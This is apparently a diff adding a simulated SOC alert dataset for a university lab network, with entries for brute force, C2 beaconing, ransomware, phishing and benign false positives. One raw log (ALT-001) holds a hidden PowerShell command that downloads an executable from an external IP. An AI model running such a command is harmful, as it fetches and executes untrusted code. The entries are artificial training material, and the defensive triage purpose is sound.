@@ -1,0 +1,200 @@
+[
+  {
+    "id": "ALT-001",
+    "timestamp": "2026-11-11T02:14:33+08:00",
+    "source": "Microsoft Defender",
+    "host": "LAB-PC-07",
+    "user": "student042",
+    "src_ip": "10.0.5.23",
+    "event_type": "suspicious_powershell",
+    "description": "PowerShell launched curl to download a file from an external IP",
+    "raw_log": "powershell.exe -nop -w hidden -c curl http://203.0.113.50/a.exe -o C:\\Users\\Public\\a.exe"
+  },
+  {
+    "id": "ALT-002",
+    "timestamp": "2026-11-11T03:41:09+08:00",
+    "source": "Splunk SIEM",
+    "host": "SRV-FILE-01",
+    "user": "admin",
+    "src_ip": "198.51.100.77",
+    "event_type": "brute_force_success",
+    "description": "214 failed SSH logins from one external IP, followed by a successful login as admin",
+    "raw_log": "sshd: Failed password x214 from 198.51.100.77 port 52211; sshd: Accepted password for admin from 198.51.100.77"
+  },
+  {
+    "id": "ALT-003",
+    "timestamp": "2026-11-11T09:05:51+08:00",
+    "source": "Microsoft Defender",
+    "host": "LAB-PC-12",
+    "user": "student150",
+    "src_ip": "10.0.5.61",
+    "event_type": "malware_detected",
+    "description": "Trojan detected in Downloads folder; quarantine action failed",
+    "raw_log": "Threat=Trojan:Win32/Wacatac.B!ml Path=C:\\Users\\student150\\Downloads\\crack_setup.exe Action=Quarantine Status=Failed"
+  },
+  {
+    "id": "ALT-004",
+    "timestamp": "2026-11-11T10:22:18+08:00",
+    "source": "Microsoft Defender",
+    "host": "STAFF-PC-03",
+    "user": "staff017",
+    "src_ip": "10.0.7.14",
+    "event_type": "credential_access",
+    "description": "Unknown process read the browser saved-password database",
+    "raw_log": "Process=tmp8821.exe Target=C:\\Users\\staff017\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data Access=Read ParentProcess=winword.exe"
+  },
+  {
+    "id": "ALT-005",
+    "timestamp": "2026-11-11T11:48:02+08:00",
+    "source": "Palo Alto Firewall",
+    "host": "LAB-PC-19",
+    "user": "student073",
+    "src_ip": "10.0.5.88",
+    "event_type": "outbound_c2_beacon",
+    "description": "Host contacts the same external IP every 60 seconds on an unusual port",
+    "raw_log": "src=10.0.5.88 dst=203.0.113.99 dport=4444 interval=60s count=142 bytes_out=512 each"
+  },
+  {
+    "id": "ALT-006",
+    "timestamp": "2026-11-11T13:30:44+08:00",
+    "source": "Microsoft Defender",
+    "host": "SRV-SHARE-02",
+    "user": "svc_backup",
+    "src_ip": "10.0.2.30",
+    "event_type": "ransomware_behavior",
+    "description": "Over 3,000 files renamed with a .locked extension within 2 minutes",
+    "raw_log": "FileRename count=3127 window=120s newExt=.locked Process=svc_update.exe ReadmeDropped=HOW_TO_RESTORE.txt"
+  },
+  {
+    "id": "ALT-007",
+    "timestamp": "2026-11-11T14:02:15+08:00",
+    "source": "Palo Alto Firewall",
+    "host": "LAB-PC-22",
+    "user": "student099",
+    "src_ip": "10.0.8.44",
+    "event_type": "port_scan",
+    "description": "One internal host probed 1,200 ports across a server subnet in 2 minutes",
+    "raw_log": "src=10.0.8.44 dst=10.0.2.0/24 distinct_ports=1200 window=120s action=allowed"
+  },
+  {
+    "id": "ALT-008",
+    "timestamp": "2026-11-11T15:19:37+08:00",
+    "source": "Cisco VPN",
+    "host": "VPN-GW-01",
+    "user": "student117",
+    "src_ip": "203.0.113.141",
+    "event_type": "repeated_failed_vpn_login",
+    "description": "18 failed VPN logins for one student account in 10 minutes from one external IP",
+    "raw_log": "vpn: auth failure user=student117 src=203.0.113.141 count=18 window=600s result=denied"
+  },
+  {
+    "id": "ALT-009",
+    "timestamp": "2026-11-11T03:12:26+08:00",
+    "source": "Splunk SIEM",
+    "host": "SRV-AD-01",
+    "user": "it.admin2",
+    "src_ip": "10.0.9.200",
+    "event_type": "admin_login_off_hours",
+    "description": "Admin account logged in at 3am from a workstation it has not used before",
+    "raw_log": "EventID=4624 User=it.admin2 LogonType=10 Time=03:12 Workstation=NEW-DEVICE-99 ChangeTicket=none"
+  },
+  {
+    "id": "ALT-010",
+    "timestamp": "2026-11-11T16:40:58+08:00",
+    "source": "Microsoft Entra ID",
+    "host": "CLOUD-SSO",
+    "user": "student088",
+    "src_ip": "198.51.100.23",
+    "event_type": "impossible_travel",
+    "description": "Same account signed in from Malaysia and then Romania 20 minutes apart",
+    "raw_log": "signin1: student088 loc=Kuala Lumpur 16:20; signin2: student088 loc=Bucharest 16:40 mfa=not_required"
+  },
+  {
+    "id": "ALT-011",
+    "timestamp": "2026-11-11T10:55:12+08:00",
+    "source": "Microsoft Defender for Office",
+    "host": "STUDENT-MAIL",
+    "user": "student201",
+    "src_ip": "10.0.6.77",
+    "event_type": "phishing_link_clicked",
+    "description": "User clicked a link in an email later flagged as phishing and entered details on the page",
+    "raw_log": "Subject='Urgent: verify your student account' ClickedUrl=hxxp://apu-login.example-verify.test Verdict=phish PostedForm=true"
+  },
+  {
+    "id": "ALT-012",
+    "timestamp": "2026-11-11T08:03:10+08:00",
+    "source": "Splunk SIEM",
+    "host": "LAB-PC-04",
+    "user": "student030",
+    "src_ip": "10.0.5.12",
+    "event_type": "failed_login",
+    "description": "3 failed logins then a successful login within 40 seconds",
+    "raw_log": "EventID=4625 x3 user=student030; EventID=4624 user=student030 elapsed=40s"
+  },
+  {
+    "id": "ALT-013",
+    "timestamp": "2026-11-11T14:36:47+08:00",
+    "source": "Microsoft Defender",
+    "host": "IT-PC-01",
+    "user": "it.admin1",
+    "src_ip": "10.0.1.5",
+    "event_type": "suspicious_powershell",
+    "description": "PowerShell run with execution policy bypass by an IT admin",
+    "raw_log": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\inventory.ps1 Note='Change ticket CHG-1042 approved'"
+  },
+  {
+    "id": "ALT-014",
+    "timestamp": "2026-11-11T01:15:20+08:00",
+    "source": "Microsoft Defender",
+    "host": "LAB-PC-03",
+    "user": "SYSTEM",
+    "src_ip": "10.0.5.9",
+    "event_type": "suspicious_child_process",
+    "description": "Windows Update service launched cmd.exe",
+    "raw_log": "ParentProcess=TiWorker.exe ChildProcess=cmd.exe /c wuauclt /detectnow Signed=Microsoft"
+  },
+  {
+    "id": "ALT-015",
+    "timestamp": "2026-11-11T12:00:03+08:00",
+    "source": "Palo Alto Firewall",
+    "host": "SCAN-01",
+    "user": "svc_nessus",
+    "src_ip": "10.0.1.10",
+    "event_type": "port_scan",
+    "description": "Internal host scanned many ports on the lab subnet",
+    "raw_log": "src=10.0.1.10 dst=10.0.5.0/24 distinct_ports=3000 Note='Scheduled weekly vulnerability scan, approved'"
+  },
+  {
+    "id": "ALT-016",
+    "timestamp": "2026-11-11T02:30:00+08:00",
+    "source": "Palo Alto Firewall",
+    "host": "SRV-BACKUP-01",
+    "user": "svc_backup",
+    "src_ip": "10.0.2.50",
+    "event_type": "large_outbound_transfer",
+    "description": "8 GB sent to an external IP overnight",
+    "raw_log": "src=10.0.2.50 dst=203.0.113.20 bytes_out=8.1GB Note='Matches nightly job to approved backup vendor'"
+  },
+  {
+    "id": "ALT-017",
+    "timestamp": "2026-11-11T17:12:41+08:00",
+    "source": "Microsoft Defender",
+    "host": "LAB-PC-15",
+    "user": "student064",
+    "src_ip": "10.0.5.40",
+    "event_type": "pua_detected",
+    "description": "Game launcher flagged as potentially unwanted application",
+    "raw_log": "Threat=PUA:Win32/Presenoker Path=C:\\Users\\student064\\AppData\\Local\\Launcher\\launcher.exe Action=Blocked"
+  },
+  {
+    "id": "ALT-018",
+    "timestamp": "2026-11-11T13:08:29+08:00",
+    "source": "Cisco Umbrella DNS",
+    "host": "LAB-PC-18",
+    "user": "student110",
+    "src_ip": "10.0.5.52",
+    "event_type": "rare_domain_lookup",
+    "description": "Host looked up a domain not seen before on the network",
+    "raw_log": "query=dl-cdn.updates-mirror.example.test type=A Note='Resolves to well-known software update CDN'"
+  }
+]
